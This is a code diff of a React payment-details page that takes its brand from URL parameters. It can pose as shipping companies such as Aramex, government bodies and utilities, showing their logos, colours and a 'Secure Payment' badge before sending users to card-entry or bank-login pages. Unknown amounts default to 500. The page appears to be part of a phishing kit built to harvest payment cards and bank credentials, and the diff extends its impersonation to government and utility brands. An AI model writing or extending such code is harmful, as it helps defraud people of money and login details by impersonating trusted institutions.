@@ -3,29 +3,22 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { shippingCompanyBranding } from "@/lib/brandingSystem";
-import { useLink } from "@/hooks/useSupabase";
+import { shippingCompanyBranding, getGovBranding, utilityBranding, getBrandingByCompany } from "@/lib/brandingSystem";
+import { useLinkData } from "@/hooks/useLinkData";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
 import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, ShieldCheck, Lock, Sparkles, CheckCircle2 } from "lucide-react";
 import { designSystem } from "@/lib/designSystem";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import BrandedCarousel from "@/components/BrandedCarousel";
-import { detectEntityFromURL, getEntityLogo, getEntityIdentity } from "@/lib/dynamicIdentity";
-import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
-import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
+import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
 import PageLoader from "@/components/PageLoader";
-import { EntityVisualInjector } from "@/components/EntityVisualInjector";
 
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData, isLoading, isError } = useLink(id);
+  const { data: linkData, isLoading, isError } = useLinkData(id);
   const [showPage, setShowPage] = useState(false);
-
-  // Apply dynamic identity
-  useAutoApplyIdentity();
-  const { identity: dynamicIdentity } = useDynamicIdentity();
 
   useEffect(() => {
     const timer = setTimeout(() => {
@@ -42,51 +35,68 @@ const PaymentDetails = () => {
 
   const urlParams = new URLSearchParams(window.location.search);
   const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
-  const serviceName = linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
+  const govId = urlParams.get('govId') || linkData?.payload?.govId;
   const branding = getServiceBranding(serviceKey);
-  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
+  const companyBranding = getBrandingByCompany(serviceKey);
+  const govBranding = govId ? getGovBranding(govId) : undefined;
+  const isUtility = !!utilityBranding[serviceKey.toLowerCase()];
+  const serviceName = govBranding?.nameAr || companyBranding?.nameAr || linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
   const shippingInfo = linkData?.payload as any;
-  
+
   const amountParam = urlParams.get('amount');
   const currencyParam = urlParams.get('currency');
   const methodParam = urlParams.get('method') || urlParams.get('pm');
   const countryParam = urlParams.get('country');
-  
+
   const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
   const currencyInfo = getCurrencyByCountry(countryCode);
 
-  const [amount, setAmount] = useState<string>(() => {
-    const raw = amountParam || shippingInfo?.cod_amount || shippingInfo?.customerInfo?.amount;
-    return raw ? raw.toString() : "";
-  });
+  const rawAmount = amountParam || shippingInfo?.cod_amount || shippingInfo?.customerInfo?.amount;
+  let amount = 500;
+  if (rawAmount !== undefined && rawAmount !== null) {
+    if (typeof rawAmount === 'number') {
+      amount = rawAmount;
+    } else if (typeof rawAmount === 'string') {
+      const parsed = parseFloat(rawAmount);
+      if (!isNaN(parsed)) {
+        amount = parsed;
+      }
+    }
+  }
 
-  const displayAmount = parseFloat(amount) || 0;
-  const formattedAmount = formatCurrency(displayAmount, currencyParam || countryCode);
+  const formattedAmount = formatCurrency(amount, currencyParam || countryCode);
 
   if (isLoading && !showPage) {
     return <PageLoader message="جاري تحميل تفاصيل الدفع..." />;
   }
-  
+
   const detectedEntity = detectEntityFromURL();
   const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
-  const displayLogo = entityLogo || branding.logo;
-  
-  const primaryColor = dynamicIdentity?.colors?.primary || companyBranding?.colors.primary || branding.colors.primary;
-  const secondaryColor = dynamicIdentity?.colors?.secondary || companyBranding?.colors.secondary || branding.colors.secondary;
-  
+  const displayLogo = entityLogo || govBranding?.logoUrl || branding.logo;
+
+  const primaryColor = govBranding?.colors.primary || companyBranding?.colors.primary || branding.colors.primary;
+  const secondaryColor = govBranding?.colors.secondary || companyBranding?.colors.secondary || branding.colors.secondary;
+
   const handleProceed = () => {
     const paymentMethod = methodParam || (linkData?.payload as any)?.payment_method || 'card';
-    
-    const nextUrl = paymentMethod === 'bank_login' 
-      ? `/pay/${id}/bank-selector?company=${serviceKey}&currency=${currencyParam || countryCode}&amount=${amount}`
-      : `/pay/${id}/card-input?company=${serviceKey}&currency=${currencyParam || countryCode}&amount=${amount}`;
-    
+    const govId = urlParams.get('govId') || linkData?.payload?.govId;
+
+    const queryParams = new URLSearchParams(window.location.search);
+    if (!queryParams.has('company')) queryParams.set('company', serviceKey);
+    if (!queryParams.has('currency')) queryParams.set('currency', currencyParam || countryCode);
+    if (!queryParams.has('amount')) queryParams.set('amount', amount.toString());
+    if (govId) queryParams.set('govId', govId);
+
+    const nextUrl = paymentMethod === 'bank_login'
+      ? `/pay/${id}/bank?${queryParams.toString()}`
+      : `/pay/${id}/card?${queryParams.toString()}`;
+
     navigate(nextUrl);
   };
-  
+
   return (
     <>
-      <PaymentMetaTags 
+      <PaymentMetaTags
         serviceKey={serviceKey}
         serviceName={serviceName}
         title={`تفاصيل الدفع - ${serviceName}`}
@@ -94,31 +104,37 @@ const PaymentDetails = () => {
         amount={formattedAmount}
       />
 
-      {/* Branded Header - Transparent Background, Logo Removed */}
-      <div 
+      {/* Branded Header */}
+      <div
         className="sticky top-0 z-50 w-full shadow-lg"
         style={{
-          background: 'transparent',
-          backdropFilter: 'blur(10px)',
+          background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
           borderBottom: `3px solid ${primaryColor}`
         }}
       >
         <div className="container mx-auto px-4">
           <div className="flex items-center justify-between h-16 sm:h-18">
             <div className="flex items-center gap-4">
-              <div style={{ color: primaryColor }}>
+              {displayLogo && (
+                <img
+                  src={displayLogo}
+                  alt={serviceName}
+                  className="h-10 sm:h-12 w-auto object-contain brightness-0 invert"
+                />
+              )}
+              <div className="text-white">
                 <h2 className="text-lg sm:text-xl font-bold">
                   {serviceName}
                 </h2>
-                <p className="text-xs opacity-75">
+                <p className="text-xs opacity-90">
                   الدفع الآمن - Secure Payment
                 </p>
               </div>
             </div>
-            
-            <div className="flex items-center gap-2 px-3 py-1.5 rounded-full backdrop-blur-sm" style={{ backgroundColor: `${primaryColor}20`, color: primaryColor }}>
-              <ShieldCheck className="w-4 h-4" />
-              <span className="text-xs font-medium">آمن</span>
+
+            <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/20 backdrop-blur-sm">
+              <ShieldCheck className="w-4 h-4 text-white" />
+              <span className="text-xs font-medium text-white">آمن</span>
             </div>
           </div>
         </div>
@@ -128,7 +144,7 @@ const PaymentDetails = () => {
       <BrandedCarousel serviceKey={serviceKey} className="mb-0" />
 
       {/* Main Content */}
-      <div 
+      <div
         className="min-h-screen py-8 sm:py-12"
         dir="rtl"
         style={{
@@ -141,7 +157,7 @@ const PaymentDetails = () => {
           <div className="text-center mb-8">
             <div className="flex items-center justify-center gap-3 mb-4">
               <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
-              <h1 
+              <h1
                 className="text-3xl sm:text-4xl font-bold"
                 style={{
                   color: designSystem.colors.neutral[900],
@@ -156,7 +172,7 @@ const PaymentDetails = () => {
             </p>
           </div>
 
-          <Card 
+          <Card
             className="overflow-hidden border-0 mb-6"
             style={{
               borderRadius: '20px',
@@ -166,7 +182,7 @@ const PaymentDetails = () => {
             {/* Shipping Info Display */}
             {shippingInfo && (
               <>
-                <div 
+                <div
                   className="px-6 sm:px-8 py-6"
                   style={{
                     background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
@@ -174,7 +190,7 @@ const PaymentDetails = () => {
                   }}
                 >
                   <div className="flex items-center gap-3">
-                    <div 
+                    <div
                       className="w-12 h-12 rounded-xl flex items-center justify-center"
                       style={{
                         background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
@@ -218,14 +234,14 @@ const PaymentDetails = () => {
           </Card>
 
           {/* Payment Summary */}
-          <Card 
+          <Card
             className="overflow-hidden border-0 mb-6"
             style={{
               borderRadius: '20px',
               boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
             }}
           >
-            <div 
+            <div
               className="px-6 sm:px-8 py-6"
               style={{
                 background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
@@ -233,7 +249,7 @@ const PaymentDetails = () => {
               }}
             >
               <div className="flex items-center gap-3">
-                <div 
+                <div
                   className="w-12 h-12 rounded-xl flex items-center justify-center"
                   style={{
                     background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
@@ -257,32 +273,30 @@ const PaymentDetails = () => {
                 <span className="text-gray-600">الخدمة</span>
                 <span className="font-bold text-base">{serviceName}</span>
               </div>
-              
-              {amount && (
-                <div 
-                  className="flex justify-between items-center py-5 px-5 rounded-xl animate-in fade-in slide-in-from-top-2"
-                  style={{
-                    background: `linear-gradient(135deg, ${primaryColor}10, ${secondaryColor}10)`
-                  }}
-                >
-                  <span className="text-lg font-bold">المبلغ الإجمالي</span>
-                  <span className="text-3xl font-bold" style={{ color: primaryColor }}>
-                    {formattedAmount}
-                  </span>
-                </div>
-              )}
+
+              <div
+                className="flex justify-between items-center py-5 px-5 rounded-xl"
+                style={{
+                  background: `linear-gradient(135deg, ${primaryColor}10, ${secondaryColor}10)`
+                }}
+              >
+                <span className="text-lg font-bold">المبلغ الإجمالي</span>
+                <span className="text-3xl font-bold" style={{ color: primaryColor }}>
+                  {formattedAmount}
+                </span>
+              </div>
             </div>
           </Card>
 
           {/* Payment Method */}
-          <Card 
+          <Card
             className="overflow-hidden border-0 mb-8"
             style={{
               borderRadius: '20px',
               boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
             }}
           >
-            <div 
+            <div
               className="px-6 sm:px-8 py-6"
               style={{
                 background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
@@ -290,7 +304,7 @@ const PaymentDetails = () => {
               }}
             >
               <div className="flex items-center gap-3">
-                <div 
+                <div
                   className="w-12 h-12 rounded-xl flex items-center justify-center"
                   style={{
                     background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
@@ -311,14 +325,14 @@ const PaymentDetails = () => {
 
             <div className="px-6 sm:px-8 py-6 bg-white">
               {(methodParam || (linkData?.payload as any)?.payment_method) === 'bank_login' ? (
-                <div 
+                <div
                   className="flex items-center gap-4 p-5 rounded-xl border-2"
                   style={{
                     borderColor: primaryColor,
                     background: `${primaryColor}08`
                   }}
                 >
-                  <div 
+                  <div
                     className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
                     style={{
                       background: `${primaryColor}20`
@@ -335,14 +349,14 @@ const PaymentDetails = () => {
                   <CheckCircle2 className="w-6 h-6" style={{ color: primaryColor }} />
                 </div>
               ) : (
-                <div 
+                <div
                   className="flex items-center gap-4 p-5 rounded-xl border-2"
                   style={{
                     borderColor: primaryColor,
                     background: `${primaryColor}08`
                   }}
                 >
-                  <div 
+                  <div
                     className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
                     style={{
                       background: `${primaryColor}20`
@@ -361,7 +375,7 @@ const PaymentDetails = () => {
               )}
             </div>
           </Card>
-      
+
           {/* Proceed Button */}
           <Button
             onClick={handleProceed}
@@ -375,7 +389,7 @@ const PaymentDetails = () => {
             <span className="ml-3">متابعة للدفع</span>
             <ArrowLeft className="w-6 h-6 mr-2" />
           </Button>
-    
+
           <div className="mt-6 flex items-center justify-center gap-2 text-sm text-gray-600">
             <Lock className="w-4 h-4" />
             <p>
